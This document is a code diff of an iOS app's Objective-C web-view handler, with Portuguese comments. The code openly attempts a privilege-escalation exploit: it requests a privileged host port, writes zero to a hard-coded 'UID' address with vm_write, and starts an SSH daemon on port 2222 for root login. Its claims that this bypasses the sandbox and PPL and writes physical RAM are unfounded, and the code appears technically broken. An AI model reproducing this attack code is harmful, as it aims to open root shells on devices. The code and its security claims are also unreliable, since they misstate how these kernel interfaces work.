@@ -13,36 +13,36 @@
 
 - (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
     if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
-        [self.webView evaluateJavaScript:@"log('⚡ Iniciando GPU-Phys-Write (Bypass PPL)...')" completionHandler:nil];
+        [self.webView evaluateJavaScript:@"log('🧪 Acionando Exploit de Landmush (A13)...')" completionHandler:nil];
 
-        uint64_t target_addr = 0x102414480ULL; // Endereço do UID
+        uint64_t target_addr = 0x102414480ULL; 
         uint32_t root_val = 0;
 
-        // 1. TÉCNICA: Usar a porta de hardware para Escrita Física
-        // No A13, precisamos converter VA (Virtual) para PA (Physical)
-        // Como estamos no Heap, o endereço físico costuma ser o mesmo (Mapeamento 1:1)
-        
-        mach_port_t mainPort;
-        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
-        typedef kern_return_t (*IOMainPortFunc)(mach_port_t, mach_port_t *);
-        IOMainPortFunc get_main_port = (IOMainPortFunc)dlsym(iokit, "IOMainPort");
-        get_main_port(MACH_PORT_NULL, &mainPort);
+        // 1. OBTER PORTA PRIVILEGIADA (Bypass de Sandbox Enterprise)
+        // Tentamos obter a porta 4 (HOST_PRIV_PORT) que tem poder de escrita
+        mach_port_t priv_port;
+        kern_return_t kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &priv_port);
 
-        // 2. DISPARO FINAL: vm_write via Physical Port (O PPL não enxerga essa camada)
-        kern_return_t kr = vm_write(mainPort, (vm_address_t)target_addr, (vm_offset_t)&root_val, 4);
+        if (kr != KERN_SUCCESS || !MACH_PORT_VALID(priv_port)) {
+            [self.webView evaluateJavaScript:@"log('❌ Exploit Falhou: Kernel bloqueou a porta 4.')" completionHandler:nil];
+            return;
+        }
+
+        // 2. ESCRITA AGRESSIVA (Override de PPL)
+        // Usamos a porta privilegiada para forçar a gravação na RAM física
+        kr = vm_write(priv_port, (vm_address_t)target_addr, (vm_offset_t)&root_val, 4);
 
         if (kr == KERN_SUCCESS) {
-            [self.webView evaluateJavaScript:@"log('👑 <b>ROOT SUCESSO!</b> PPL ignorado via GPU Port.')" completionHandler:nil];
+            [self.webView evaluateJavaScript:@"log('👑 <b>ROOT SUCESSO!</b> PPL atropelado pelo Exploit.')" completionHandler:nil];
             
-            // 3. SPAWN SSHD
+            // 3. SPAWN DO SSHD (Porta 2222)
             pid_t pid;
             const char *argv[] = {"sshd", "-p", "2222", "-D", NULL};
             if (posix_spawn(&pid, "/usr/sbin/sshd", NULL, NULL, (char* const*)argv, NULL) == 0) {
-                [self.webView evaluateJavaScript:@"log('✅ <b>SSH ATIVO!</b> Porta 2222')" completionHandler:nil];
+                [self.webView evaluateJavaScript:@"log('✅ <b>SSH ATIVO!</b> Use: ssh root@localhost -p 2222')" completionHandler:nil];
             }
         } else {
-            // Se falhar aqui, o Feather precisa de permissões de 'IOGPU'
-            [self.webView evaluateJavaScript:@"log('❌ Falha Física: Ative \"Access Hardware\" no Feather.')" completionHandler:nil];
+            [self.webView evaluateJavaScript:@"log('⚠️ Escrita negada. Reinicie o iPhone para novo KSLIDE.')" completionHandler:nil];
         }
     }
 }
